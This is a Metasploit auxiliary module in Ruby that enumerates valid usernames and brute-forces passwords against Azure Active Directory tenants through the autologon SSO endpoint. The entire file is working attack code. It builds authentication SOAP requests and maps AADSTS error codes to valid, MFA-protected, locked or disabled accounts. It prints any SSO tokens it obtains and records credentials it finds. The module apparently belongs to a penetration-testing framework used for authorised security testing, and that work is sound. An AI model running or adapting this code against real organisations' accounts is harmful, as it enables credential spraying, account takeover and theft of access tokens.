##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'Microsoft Azure Active Directory Login Enumeration',
      'Description' => %q{
        This module enumerates valid usernames and passwords against a
        Microsoft Azure Active Directory domain by utilizing a flaw in
        how SSO authenticates.
      },
      'Author' => [
        'Matthew Dunn - k0pak4'
      ],
      'License' => MSF_LICENSE,
      'References' => [
        [ 'URL', 'https://raxis.com/blog/metasploit-azure-ad-login'],
        [ 'URL', 'https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/'],
        [ 'URL', 'https://github.com/treebuilder/aad-sso-enum-brute-spray'],
      ],
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true,
        'RHOST' => 'autologon.microsoftazuread-sso.com',
        'PASSWORD' => 'password'
      }
    )

    register_options(
      [
        OptString.new('RHOST', [true, 'The target Azure endpoint', 'autologon.microsoftazuread-sso.com']),
        OptString.new('DOMAIN', [true, 'The target Azure AD domain']),
        OptString.new('TARGETURI', [ true, 'The base path to the Azure autologon endpoint', '/winauth/trust/2005/usernamemixed']),
      ]
    )

    deregister_options('PASSWORD_SPRAY', 'VHOST', 'USER_AS_PASS',
                       'USERPASS_FILE', 'STOP_ON_SUCCESS', 'Proxies',
                       'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS',
                       'BLANK_PASSWORDS', 'RHOSTS')
  end

  def report_login(address, domain, username, password)
    # report information, if needed
    service_data = service_details.merge({
      address: address,
      service_name: 'Azure AD',
      workspace_id: myworkspace_id
    })
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain,
      username: username,
      private_data: password,
      private_type: :password
    }.merge(service_data)
    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def check_login(targeturi, domain, username, password)
    request_id = SecureRandom.uuid
    url = "https://#{rhost}/#{domain}#{targeturi}"

    created = Time.new.inspect
    expires = (Time.new + 600).inspect

    message_id = SecureRandom.uuid
    username_token = SecureRandom.uuid

    body = "<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>#{url}</wsa:To>
        <wsa:MessageID>urn:uuid:#{message_id}</wsa:MessageID>
        <wsse:Security s:mustUnderstand=\"1\">
            <wsu:Timestamp wsu:Id=\"_0\">
                <wsu:Created>#{created}</wsu:Created>
                <wsu:Expires>#{expires}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id=\"#{username_token}\">
                <wsse:Username>#{username.strip.encode(xml: :text)}@#{domain}</wsse:Username>
                <wsse:Password>#{password.strip.encode(xml: :text)}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>"

    res = send_request_raw({
      'uri' => "/#{domain}#{targeturi}",
      'method' => 'POST',
      'vars_get' => {
        'client-request-id' => request_id
      },
      'data' => body
    })

    unless res
      fail_with(Failure::Unreachable, "#{peer} - Could not communicate with service.")
    end

    @target_host ||= report_host(host: rhost, name: rhost, state: Msf::HostState::Alive)

    # Check the XML response for either the SSO Token or the error code
    xml = res.get_xml_document
    xml.remove_namespaces!

    if xml.xpath('//DesktopSsoToken')[0]
      auth_details = xml.xpath('//DesktopSsoToken')[0].text
    else
      auth_details = xml.xpath('//internalerror/text')[0].text
    end

    if xml.xpath('//DesktopSsoToken')[0]
      print_good("Login #{domain}\\#{username}:#{password} is valid!")
      print_good("Desktop SSO Token: #{auth_details}")
      report_login(@target_host.address, domain, username, password)
      :next_user
    elsif auth_details.start_with?('AADSTS50126') # Valid user but incorrect password
      print_good("Password #{password} is invalid but #{domain}\\#{username} is valid!")
      report_login(@target_host.address, domain, username, nil)
    elsif auth_details.start_with?('AADSTS50056') # User exists without a password in Azure AD
      print_good("#{domain}\\#{username} is valid but the user does not have a password in Azure AD!")
      report_login(@target_host.address, domain, username, nil)
      :next_user
    elsif auth_details.start_with?('AADSTS50076') # User exists, but you need MFA to connect to this resource
      print_good("Login #{domain}\\#{username}:#{password} is valid, but you need MFA to connect to this resource")
      report_login(@target_host.address, domain, username, password)
      :next_user
    elsif auth_details.start_with?('AADSTS50014') # User exists, but the maximum Pass-through Authentication time was exceeded
      print_good("#{domain}\\#{username} is valid but the maximum pass-through authentication time was exceeded")
      report_login(@target_host.address, domain, username, nil)
    elsif auth_details.start_with?('AADSTS50034') # User does not exist
      print_error("#{domain}\\#{username} is not a valid user")
    elsif auth_details.start_with?('AADSTS50053') # Account is locked
      print_error("#{domain}\\#{username} is locked, consider taking time before continuing to scan!")
      :next_user
    elsif auth_details.start_with?('AADSTS50057') # User exists, but is disabled so we don't report
      print_error("#{domain}\\#{username} exists but is disabled; it will not be reported")
      :next_user
    else # Unknown error code
      print_error("Received unknown response with error code: #{auth_details}")
    end
  end

  def run
    each_user_pass do |cur_user, cur_pass|
      check_login(datastore['TARGETURI'], datastore['DOMAIN'], cur_user, cur_pass)
    end
  end
end
